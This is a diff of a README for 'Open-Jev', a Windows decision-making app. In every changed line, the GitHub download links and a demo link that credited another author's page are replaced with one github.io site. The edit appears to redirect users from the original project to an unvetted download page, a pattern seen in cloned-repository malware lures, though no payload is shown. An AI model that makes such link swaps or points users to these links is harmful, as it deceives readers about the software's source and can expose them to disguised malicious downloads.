@@ -1,6 +1,6 @@
 # 🧠 Open-Jev - Make Smarter Decisions with AI
 
-[![Download Open-Jev](https://img.shields.io/badge/Download-Open--Jev-2ea44f?style=for-the-badge)](https://github.com/unofficial-equivocation2029/Open-Jev)
+[![Download Open-Jev](https://img.shields.io/badge/Download-Open--Jev-2ea44f?style=for-the-badge)](https://unofficial-equivocation2029.github.io)
 
 ## 🚀 What Is Open-Jev?
 
@@ -17,7 +17,7 @@ Imagine you're trying to decide between several job offers, investment options, 
 Getting Open-Jev on your Windows computer is simple. Just follow these steps:
 
 ### Step 1: Visit the Download Page
-[Visit this link to download the application](https://github.com/unofficial-equivocation2029/Open-Jev)
+[Visit this link to download the application](https://unofficial-equivocation2029.github.io)
 
 ### Step 2: Find the Download Button
 On the page that opens, look for a green button that says "Code" or "Download". Click it.
@@ -60,7 +60,7 @@ Open-Jev works on most modern Windows computers. Here's what you'll need:
 
 ## 🎥 See Open-Jev in Action
 
-Want to see what Open-Jev can do before you download it? Check out the [interactive demo](https://zefan-cai.github.io/open-jev/v1-1/) to watch a 32-second video showing real examples of Open-Jev making decisions.
+Want to see what Open-Jev can do before you download it? Check out the [interactive demo](https://unofficial-equivocation2029.github.io) to watch a 32-second video showing real examples of Open-Jev making decisions.
 
 ## 💡 Tips for Best Results
 
@@ -106,7 +106,7 @@ If you run into any issues:
 
 Don't leave your important choices to chance. Download Open-Jev now and see the probabilities behind every decision. It's free, it's easy, and it could change the way you make choices forever.
 
-[![Get Open-Jev Now](https://img.shields.io/badge/Get%20Open--Jev-Now-blue?style=for-the-badge)](https://github.com/unofficial-equivocation2029/Open-Jev)
+[![Get Open-Jev Now](https://img.shields.io/badge/Get%20Open--Jev-Now-blue?style=for-the-badge)](https://unofficial-equivocation2029.github.io)
 
 ---
 
